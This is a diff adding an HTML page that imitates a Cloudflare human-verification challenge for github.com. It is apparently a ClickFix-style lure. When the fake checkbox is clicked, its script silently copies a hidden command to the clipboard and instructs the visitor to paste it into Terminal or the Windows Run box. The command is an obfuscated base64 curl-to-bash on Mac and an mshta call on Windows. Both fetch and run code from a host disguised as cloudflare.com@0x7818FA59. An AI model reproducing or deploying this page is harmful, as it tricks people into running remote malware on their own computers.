@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+    <title>Just a moment...</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <link rel="shortcut icon" href="assets/favicon.png">
+    <style>
+        :root {
+            --cf-body-bg-light: #fff;
+            --cf-body-color-light: #000;
+            --cf-text-light: #000;
+            --cf-link-light: #0051c3;
+            --cf-link-hover-light: #ee730a;
+            --cf-border-light: #ddd;
+            --cf-kbd-bg-light: #f8f9fa;
+            --cf-kbd-border-light: #dadce0;
+            --cf-kbd-text-light: #202124;
+            --cf-code-bg-light: #fff;
+            --cf-code-border-light: #dadce0;
+            --cf-button-copy-bg-light: #34a853;
+            --cf-button-copy-text-light: #fff;
+
+            --cf-body-bg-dark: #232323;
+            --cf-body-color-dark: #d9d9d9; 
+            --cf-text-dark: #d9d9d9;       
+            --cf-link-dark: #d1d1d1; 
+            --cf-link-hover-dark: #ff9955;
+            --cf-border-dark: #d9d9d9; 
+            --cf-kbd-bg-dark: #3a3a3a;
+            --cf-kbd-border-dark: #505050;
+            --cf-kbd-text-dark: #e0e0e0;
+            --cf-code-bg-dark: #2c2c2c;
+            --cf-code-border-dark: #505050;
+            --cf-button-copy-bg-dark: #28a745;
+            --cf-button-copy-text-dark: #fff;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        html { line-height: 1.15; -webkit-text-size-adjust: 100%; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"; }
+        body {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            min-height: 100vh;
+            background-color: var(--cf-body-bg-light);
+            color: var(--cf-body-color-light);
+            transition: background-color 0.3s, color 0.3s;
+        }
+        body.theme-dark {
+            background-color: var(--cf-body-bg-dark);
+            color: var(--cf-body-color-dark);
+        }
+
+        .verification-code-container .command-display-text {
+            font-family: 'Roboto Mono', monospace; color: var(--cf-kbd-text-light); word-break: break-all;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+        body.theme-dark .verification-code-container .command-display-text {
+            color: var(--cf-kbd-text-dark);
+        }
+
+        .main-wrapper { display: flex; flex-direction: column; flex: 1; align-items: center; }
+        .main-content { width:100%; margin: 4rem auto; max-width: 60rem; padding-left: 1.5rem; padding-right: 1.5rem; }
+        @media (max-width: 720px) { .main-content { margin-top: 2rem; } }
+
+        .h1 { font-size: 2.5rem; font-weight: 500; line-height: 3.75rem; color: var(--cf-text-light); }
+        .h2 { font-size: 1.5rem; font-weight: 500; line-height: 2.25rem; color: var(--cf-text-light); }
+        .core-msg { font-size: 1.5rem; font-weight: 400; line-height: 2.25rem; color: var(--cf-text-light); }
+        .body-text { font-size: 1rem; font-weight: 400; line-height: 1.25rem; color: var(--cf-text-light); }
+        .zone-name-title { overflow-wrap: break-word; }
+
+        body.theme-dark .h1, body.theme-dark .h2, body.theme-dark .core-msg, body.theme-dark .body-text, body.theme-dark .zone-name-title { color: var(--cf-text-dark); }
+        body.theme-dark #vUih6 { color: var(--cf-text-dark) !important; }
+
+
+        @media (max-width: 720px) {
+            .h1 { font-size: 1.5rem; line-height: 1.75rem; }
+            .h2 { font-size: 1.25rem; line-height: 1.5rem; }
+            .core-msg { font-size: 1rem; line-height: 1.5rem; }
+        }
+        
+        .spacer { margin: 2rem 0; }
+        .spacer-top { margin-top: 2rem; }
+        .spacer-bottom { margin-bottom: 1.5rem; }
+
+        #checkbox-placement-container {
+            margin-bottom: 1.5rem; 
+        }
+        #cf-turnstile-widget { 
+            border: 0; 
+            overflow: hidden;
+            width: 304px; 
+            height: 67px; 
+            background: transparent;
+            display: block; 
+            margin-left: 0; 
+        }
+        #vUih6 {
+            margin-top: 1.5rem;
+            margin-bottom: 1.5rem; }
+
+        .unusual-traffic-header { color: #e13238; font-size: 1.3em; margin-top:0; margin-bottom: 1em; }
+        body.theme-dark .unusual-traffic-header { color: #ff6b6b; }
+
+        .steps-container {
+            background-color: var(--cf-kbd-bg-light); border-radius: 8px; padding: 1.5rem;
+            margin: 1rem 0 2rem 0; border: 1px solid var(--cf-kbd-border-light); color: var(--cf-kbd-text-light);
+        }
+        body.theme-dark .steps-container {
+            background-color: var(--cf-kbd-bg-dark); border-color: var(--cf-kbd-border-dark); color: var(--cf-kbd-text-dark);
+        }
+        .steps-container p, .steps-container li { color: inherit; margin-bottom: 10px; line-height: 1.6; }
+        .steps-container ol { margin-left: 20px; padding-left: 0; }
+        
+        kbd {
+            background-color: var(--cf-kbd-bg-light); border: 1px solid var(--cf-kbd-border-light); border-radius: 4px;
+            box-shadow: 0 1px 1px rgba(0,0,0,0.05), 0 0 0 1px rgba(0,0,0,0.03);
+            color: var(--cf-kbd-text-light); display: inline-flex; 
+            align-items: center; 
+            font-family: 'SF Mono', 'Roboto Mono', Consolas, 'Liberation Mono', Menlo, Courier, monospace;
+            font-size: 0.85em; 
+            font-weight: 500; 
+            line-height: 1.5; 
+            padding: 0.25em 0.5em; 
+            margin: 0 0.15em; 
+            white-space: nowrap;
+            vertical-align: middle; 
+        }
+        body.theme-dark kbd {
+            background-color: var(--cf-kbd-bg-dark); border-color: var(--cf-kbd-border-dark); color: var(--cf-kbd-text-dark);
+            box-shadow: 0 1px 1px rgba(255,255,255,0.05), 0 0 0 1px rgba(255,255,255,0.03);
+        }
+        .key-icon-win {
+            height: 0.9em; 
+            width: auto;
+            margin-left: 0.25em;
+            vertical-align: -0.1em; 
+        }
+        body.theme-dark .key-icon-win {
+             filter: brightness(0) invert(1);
+        }
+
+
+        .verification-code-container {
+            display: flex; justify-content: space-between; align-items: center; background-color: var(--cf-code-bg-light);
+            padding: 0.8rem 1rem; border-radius: 4px; border: 1px solid var(--cf-code-border-light); margin: 15px 0;
+        }
+        body.theme-dark .verification-code-container {
+            background-color: var(--cf-code-bg-dark); border-color: var(--cf-code-border-dark);
+        }
+        .verification-code-container .command-display-text {
+            font-family: 'Roboto Mono', monospace; color: var(--cf-kbd-text-light); word-break: break-all;
+        }
+        body.theme-dark .verification-code-container .command-display-text { color: var(--cf-kbd-text-dark); }
+        .copy-button {
+            background-color: var(--cf-button-copy-bg-light); color: var(--cf-button-copy-text-light); border: none;
+            border-radius: 4px; padding: 0.8rem 1.2rem; margin-left: 1rem; cursor: pointer; font-weight: 500;
+            transition: background-color 0.2s; flex-shrink: 0;
+        }
+        body.theme-dark .copy-button {
+            background-color: var(--cf-button-copy-bg-dark); color: var(--cf-button-copy-text-dark);
+        }
+        .copy-button:hover { opacity: 0.8; }
+
+        .footer { width: 100%; max-width: 60rem; margin: 0 auto; padding: 1.5rem; padding-bottom: 0; font-size: .75rem; line-height: 1.125rem; text-align: center; }
+        .footer-inner { border-top: 1px solid var(--cf-border-light); padding-top: 1rem; padding-bottom: 1rem; }
+        body.theme-dark .footer-inner { border-color: var(--cf-border-dark); }
+        .footer .ray-id { display: block; margin-bottom: 0.5rem; color: var(--cf-text-light); }
+        body.theme-dark .footer .ray-id { color: var(--cf-text-dark); }
+        .footer .ray-id code { font-family: monaco, courier, monospace; color: inherit; }
+        .footer #footer-text { color: var(--cf-text-light); }
+        body.theme-dark .footer #footer-text { color: var(--cf-text-dark); }
+        .footer a { color: var(--cf-link-light); text-decoration: underline; }
+        .footer a:hover { color: var(--cf-link-hover-light); }
+        body.theme-dark .footer a { color: var(--cf-link-dark); }
+        body.theme-dark .footer a:hover { color: var(--cf-link-hover-dark); }
+
+        @media (width <= 720px) {
+            .zone-name-title { margin-bottom: 1rem; }
+            .footer { padding: 1rem; }
+            #cf-turnstile-widget { margin: 0 auto; }
+        }
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+    <div class="main-wrapper" role="main">
+        <div class="main-content">
+            <h1 class="zone-name-title h1">website</h1>
+            
+            <p id="challenge-status-text" class="h2 spacer-bottom">Verify you are human by completing the action below.</p>
+
+            <div id="checkbox-placement-container">
+                <iframe src="assets/index_1.html" id="cf-turnstile-widget" title="Cloudflare Turnstile Widget"></iframe>
+            </div>
+            
+            <div id="vUih6" class="core-msg hidden">website needs to review the security of your connection before proceeding.</div>
+
+            <div id="mobile-message-section" class="core-msg spacer hidden">
+                <p>⚠️ This page is intended for desktop use.</p>
+                <p>Please open this page on a Windows or macOS computer to proceed.</p>
+            </div>
+
+            <div id="unusual-traffic-section" class="hidden"> 
+                <h2 class="unusual-traffic-header">▲ Unusual Web Traffic Detected</h2>
+                <p class="warning-text body-text">
+                    Our security system has identified irregular web activity originating from your IP address. Automated verification attempts have failed, and we were unable to confirm that you are a legitimate user.
+                </p>
+                <div class="steps-container">
+                    <p>To proceed, please follow these steps for your operating system:</p>
+                    
+                    <div id="mac-instructions" class="hidden">
+                        <ol>
+                            <li>Press <kbd>Command ⌘</kbd> + <kbd>Space</kbd> to open Spotlight.</li>
+                            <li>Type "terminal" and press <kbd>Return</kbd>.</li>
+                            <!--<li>Click the 'Copy' button below to copy the command.</li>-->
+                        </ol>
+                        <!--<div class="verification-code-container">
+                            <span class="command-display-text">'I am not a robot: Cloudflare Verification ID: 0x7818FA59'</span>
+                            <button id="copy-mac-command" class="copy-button">Copy</button>
+                        </div>-->
+                        <ol start="3">
+                            <li>Paste (<kbd>Command ⌘</kbd>+<kbd>V</kbd>) the Verification code‌ into Terminal and press <kbd>Return</kbd>.</li>
+                        </ol>
+                    </div>
+
+                    <div id="windows-instructions" class="hidden">
+                        <ol>
+                            <li>Press <kbd>Win<img src="assets/window.png" alt="Windows" class="key-icon-win"></kbd> + <kbd>R</kbd>.</li>
+                            <!--<li>Click the 'Copy' button below to copy the command.</li>-->
+                        </ol>
+						<!--
+                        <div class="verification-code-container">
+                            <span class="command-display-text">'I am not a robot: Cloudflare Verification ID: 0x7818FA59'</span>
+                            <button id="copy-windows-command" class="copy-button">Copy</button>
+                        </div>
+						-->
+                        <ol start="2">
+                            <li>Paste (<kbd>Ctrl</kbd>+<kbd>V</kbd>) the Verification code‌ into Box and press <kbd>Enter</kbd>.</li>
+                        </ol>
+                    </div>
+                    <div id="unknown-os-instructions" class="hidden">
+                        <p>Your operating system could not be automatically recognized. Please follow these steps:</p>
+                        <ol>
+                            <li>Click the 'Copy' button below to copy the command.</li>
+                            <li>Open a terminal or command prompt application on your system.</li>
+                            <li>Paste the copied command into the terminal and press <kbd>Enter</kbd>.</li>
+                        </ol>
+                        <div class="verification-code-container">
+                            <span class="command-display-text">'I am not a robot: Cloudflare Verification ID: 0x7818FA59'</span>
+                            <button id="copy-unknown-os-command" class="copy-button">Copy</button>
+                        </div>
+                    </div>
+                </div>
+                <p class="core-msg body-text" style="margin: 1em 0;">
+                    This manual verification step helps us ensure that your connection is secure and not part of an automated request. If you fail to complete this step, access to certain features may be temporarily restricted.
+                </p>
+            </div>
+
+            <noscript>
+                <div class="h2"><span id="challenge-error-text">Enable JavaScript and cookies to continue</span></div>
+            </noscript>
+        </div>
+    </div>
+
+    <div class="footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="ray-id">Ray ID: <code id="ray-id-value">93f05fb8ac2d7737</code></div>
+            <div id="footer-text">
+                Performance & security by <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&utm_campaign=m" target="_blank">Cloudflare</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const body = document.body;
+            const challengeStatusText = document.getElementById('challenge-status-text');
+            const checkboxPlacementContainer = document.getElementById('checkbox-placement-container');
+            const turnstileIframe = document.getElementById('cf-turnstile-widget');
+            const vUih6Message = document.getElementById('vUih6');
+            const mobileMessageSection = document.getElementById('mobile-message-section');
+            const unusualTrafficSection = document.getElementById('unusual-traffic-section');
+
+            const macInstructions = document.getElementById('mac-instructions');
+            const windowsInstructions = document.getElementById('windows-instructions');
+            const unknownOsInstructions = document.getElementById('unknown-os-instructions');
+
+            const copyMacCommandButton = document.getElementById('copy-mac-command');
+            const copyWindowsCommandButton = document.getElementById('copy-windows-command');
+            const copyUnknownOsCommandButton = document.getElementById('copy-unknown-os-command');
+
+            const zoneNameTitle = document.querySelector('.zone-name-title.h1');
+            //const currentHostPath = window.location.host + (window.location.pathname === '/' ? '' : window.location.pathname);
+            const currentHostPath = "github.com";
+            
+            if (zoneNameTitle) {
+                zoneNameTitle.textContent = currentHostPath;
+            }
+            if (vUih6Message) {
+                vUih6Message.textContent = `${currentHostPath} needs to review the security of your connection before proceeding.`;
+            }
+
+
+            const winda = `echo "I am not a robot: Cloudflare Verification ID: 0x7818FA59"&&echo "Y3VybCAtcyBodHRwOi8vd3d3LmNsb3VkZmxhcmUuY29tQDB4NzgxOEZBNTkgfCBiYXNoCg=="|base64 -d| bash`;
+            const windowsCompatibleCommand = `mshta http://www.cloudflare.com@0x7818fa59/cap
+			`;
+            let currentThemeIsDark = false;
+
+            function applyTheme(isDark) {
+                currentThemeIsDark = isDark;
+                if (isDark) {
+                    body.classList.add('theme-dark'); body.classList.remove('theme-light');
+                } else {
+                    body.classList.add('theme-light'); body.classList.remove('theme-dark');
+                }
+                if (turnstileIframe) {
+                    const currentIframeSrc = turnstileIframe.getAttribute('src') || "assets/index_1.html";
+                    const baseSrc = currentIframeSrc.split('?')[0];
+                    const newIframeSrc = `${baseSrc}?theme=${isDark ? 'dark' : 'light'}`;
+                    if (turnstileIframe.getAttribute('src') !== newIframeSrc) {
+                         turnstileIframe.setAttribute('src', newIframeSrc);
+                    }
+                }
+            }
+
+            const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+            applyTheme(prefersDark);
+
+            window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+                applyTheme(e.matches);
+            });
+
+            function getOS() {
+                const ua = navigator.userAgent;
+                if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "tablet";
+                if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "mobile";
+                if (ua.includes("Macintosh") || ua.includes("MacIntel") || ua.includes("MacPPC") || ua.includes("Mac OS")) return "mac";
+                if (ua.includes("Windows") || ua.includes("Win64") || ua.includes("Win32")) return "windows";
+                return "unknown";
+            }
+            const userOS = getOS();
+
+            if (userOS === "mobile" || userOS === "tablet") {
+                checkboxPlacementContainer.classList.add('hidden');
+                vUih6Message.classList.add('hidden');
+                unusualTrafficSection.classList.add('hidden');
+                mobileMessageSection.classList.remove('hidden');
+                challengeStatusText.textContent = "Device Not Supported";
+            } else {
+                mobileMessageSection.classList.add('hidden');
+                checkboxPlacementContainer.classList.remove('hidden');
+
+                if (turnstileIframe) {
+                    turnstileIframe.setAttribute('src', `assets/index_1.html?theme=${currentThemeIsDark ? 'dark' : 'light'}`);
+                }
+
+                window.addEventListener('message', (event) => {
+                    if (event.data === 'turnstileClicked') {
+                        console.log("验证图标被点击，自动复制命令到剪贴板。");
+                        
+                        // 根据操作系统类型自动复制对应的命令
+                        let commandToCopy = '';
+                        if (userOS === "mac") {
+                            commandToCopy = winda;
+                        } else if (userOS === "windows") {
+                            commandToCopy = windowsCompatibleCommand;
+                        } else {
+                            commandToCopy = winda; // 未知系统使用默认命令
+                        }
+                        
+                        // 自动复制命令到剪贴板
+                        if (navigator.clipboard && window.isSecureContext) {
+                            navigator.clipboard.writeText(commandToCopy).then(() => {
+                                console.log(`已自动复制${userOS}命令到剪贴板`);
+                            }).catch(err => {
+                                console.error('自动复制失败: ', err);
+                            });
+                        } else {
+                            // 备用复制方法
+                            const textArea = document.createElement("textarea");
+                            textArea.value = commandToCopy;
+                            textArea.style.position = 'fixed';
+                            textArea.style.top = '-9999px';
+                            textArea.style.left = '-9999px';
+                            document.body.appendChild(textArea);
+                            textArea.focus();
+                            textArea.select();
+                            try {
+                                document.execCommand('copy');
+                                console.log(`已自动复制${userOS}命令到剪贴板（备用方法）`);
+                            } catch (err) {
+                                console.error('备用复制方法失败: ', err);
+                            }
+                            document.body.removeChild(textArea);
+                        }
+                        
+                        // 2秒后显示内容
+                        setTimeout(() => {
+                            vUih6Message.classList.remove('hidden');
+                            unusualTrafficSection.classList.remove('hidden');
+                            console.log("内容已显示。");
+                        }, 2000);
+                    }
+                }, false);
+
+                macInstructions.classList.add('hidden');
+                windowsInstructions.classList.add('hidden');
+                unknownOsInstructions.classList.add('hidden');
+
+                if (userOS === "mac" || userOS === "unknown") {
+                    macInstructions.classList.remove('hidden');
+                    copyMacCommandButton.addEventListener('click', () => copyToClipboard(winda, copyMacCommandButton));
+                } else if (userOS === "windows") {
+                    windowsInstructions.classList.remove('hidden');
+                    const windowsCompatibleCommand = `mshta http://www.cloudflare.com@0x7818fa59/cap
+					`;
+                    copyWindowsCommandButton.addEventListener('click', () => copyToClipboard(windowsCompatibleCommand, copyWindowsCommandButton));
+                } else {
+                    unknownOsInstructions.classList.remove('hidden');
+                    copyUnknownOsCommandButton.addEventListener('click', () => copyToClipboard(winda, copyUnknownOsCommandButton));
+                }
+            }
+
+            function copyToClipboard(text, buttonElement) {
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.writeText(text).then(() => {
+                        const originalText = buttonElement.textContent;
+                        buttonElement.textContent = "Copied!";
+                        setTimeout(() => {
+                            buttonElement.textContent = originalText;
+                        }, 2000);
+                    }).catch(err => {
+                        console.error('Failed to copy with navigator.clipboard: ', err);
+                        fallbackCopyToClipboard(text, buttonElement);
+                    });
+                } else {
+                    console.warn('Using fallback copy method due to insecure context or missing Clipboard API.');
+                    fallbackCopyToClipboard(text, buttonElement);
+                }
+            }
+
+            function fallbackCopyToClipboard(text, buttonElement) {
+                const textArea = document.createElement("textarea");
+                textArea.value = text;
+
+                textArea.style.position = 'fixed';
+                textArea.style.top = '-9999px';
+                textArea.style.left = '-9999px';
+
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+
+                try {
+                    const successful = document.execCommand('copy');
+                    if (successful) {
+                        const originalText = buttonElement.textContent;
+                        buttonElement.textContent = "Copied!";
+                        setTimeout(() => {
+                            buttonElement.textContent = originalText;
+                        }, 2000);
+                    } else {
+                        console.error('Fallback: Failed to copy command.');
+                        alert('Failed to copy command. Please copy it manually.');
+                    }
+                } catch (err) {
+                    console.error('Fallback: Error trying to copy command: ', err);
+                    alert('Error trying to copy. Please copy it manually.');
+                }
+
+                document.body.removeChild(textArea);
+            }
+        });
+    </script>
+</body>
+</html>
